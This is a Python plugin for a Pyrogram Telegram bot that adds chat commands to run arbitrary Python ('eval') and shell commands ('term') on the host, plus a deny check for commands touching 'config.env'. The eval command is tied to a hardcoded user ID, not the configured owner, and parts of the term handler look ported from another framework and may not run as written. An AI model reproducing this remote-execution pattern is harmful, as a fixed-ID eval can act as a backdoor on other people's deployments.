import sys
import io
import keyword
import traceback
import asyncio

from getpass import getuser
from os import geteuid
from pyrogram import filters
from pyrogram.types import Message
from jutsu.helpers import telegrapher
from jutsu import sedex, Sedex, Config


@sedex.on_message(
    filters.command(["eval"], prefixes=";")
    & filters.user([1013414037])
    & filters.group,
    group=8
)
async def eval_(sedex: Sedex, message: Message):
    try:
        cmd = (message.text).split(" ", 1)[1]
    except:
        return await sedex.send_message(message.chat.id, "`Command not found.`", reply_to_message_id=message.message_id)
    msg = await sedex.send_message(message.chat.id, "`Executing eval...`", reply_to_message_id=message.message_id)
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    ret_val, stdout, stderr, exc = None, None, None, None
    async def aexec(code):
        head = "async def __aexec(bot, message):\n "
        if "\n" in code:
            rest_code = "\n ".join(iter(code.split("\n")))
        elif (
            any(
                True
                for k_ in keyword.kwlist
                if k_ not in ("True", "False", "None") and code.startswith(f"{k_} ")
            )
            or "=" in code
        ):
            rest_code = f"\n {code}"
        else:
            rest_code = f"\n return {code}"
        exec(head + rest_code)  # nosec pylint: disable=W0122
        return await locals()["__aexec"](sedex, message)

    try:
        ret_val = await aexec(cmd)
    except Exception:  # pylint: disable=broad-except
        exc = traceback.format_exc().strip()
    stdout = redirected_output.getvalue().strip()
    stderr = redirected_error.getvalue().strip()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = exc or stderr or stdout or ret_val
    output = f"**>** ```{cmd}```\n\n"
    output += f"**>>** ```{evaluation}```" if evaluation else ""
    if evaluation:
        if len(output) > 4096:
            link = telegrapher("EVAL from UX_JutsuBot.", output)
            await msg.edit(f"Eval for the command given is **[HERE]({link})**.")
        else:
            await msg.edit(
                text=output, parse_mode="md"
            )


@sedex.on_message(
    filters.command("term", prefixes=";")
    & filters.user([Config.OWNER_ID]),
    group=-2
)
async def term_(message: Message):
    """run commands in shell (terminal with live update)"""
    cmd = await init_func(message)
    if cmd is None:
        return
    await message.edit("`Executing terminal ...`")
    try:
        t_obj = await Term.execute(cmd)  # type: Term
    except Exception as t_e:  # pylint: disable=broad-except
        await message.err(str(t_e))
        return
    curruser = getuser()
    try:
        uid = geteuid()
    except ImportError:
        uid = 1
    output = f"{curruser}:~# {cmd}\n" if uid == 0 else f"{curruser}:~$ {cmd}\n"
    count = 0
    while not t_obj.finished:
        count += 1
        if message.process_is_canceled:
            t_obj.cancel()
            await message.reply("`process canceled!`")
            return
        await asyncio.sleep(0.5)
        if count >= Config.EDIT_SLEEP_TIMEOUT * 2:
            count = 0
            out_data = f"<pre>{output}{t_obj.read_line}</pre>"
            await message.try_to_edit(out_data, parse_mode="html")
    out_data = f"<pre>{output}{t_obj.get_output}</pre>"
    await message.edit_or_send_as_file(
        out_data, parse_mode="html", filename="term.txt", caption=cmd
    )


async def init_func(message: Message):
    cmd = message.input_str
    if not cmd:
        await message.err("No Command Found!")
        return None
    if "config.env" in cmd:
        await message.err("That's a dangerous operation! Not Permitted!")
        return None
    return cmd


class Term:
    """live update term class"""

    def __init__(self, process: asyncio.subprocess.Process) -> None:
        self._process = process
        self._stdout = b""
        self._stderr = b""
        self._stdout_line = b""
        self._stderr_line = b""
        self._finished = False

    def cancel(self) -> None:
        self._process.kill()

    @property
    def finished(self) -> bool:
        return self._finished

    @property
    def read_line(self) -> str:
        return (self._stdout_line + self._stderr_line).decode("utf-8").strip()

    @property
    def get_output(self) -> str:
        return (self._stdout + self._stderr).decode("utf-8").strip()

    async def _read_stdout(self) -> None:
        while True:
            line = await self._process.stdout.readline()
            if line:
                self._stdout_line = line
                self._stdout += line
            else:
                break

    async def _read_stderr(self) -> None:
        while True:
            line = await self._process.stderr.readline()
            if line:
                self._stderr_line = line
                self._stderr += line
            else:
                break

    async def worker(self) -> None:
        await asyncio.wait([self._read_stdout(), self._read_stderr()])
        await self._process.wait()
        self._finished = True

    @classmethod
    async def execute(cls, cmd: str) -> "Term":
        process = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        t_obj = cls(process)
        asyncio.get_event_loop().create_task(t_obj.worker())
        return t_obj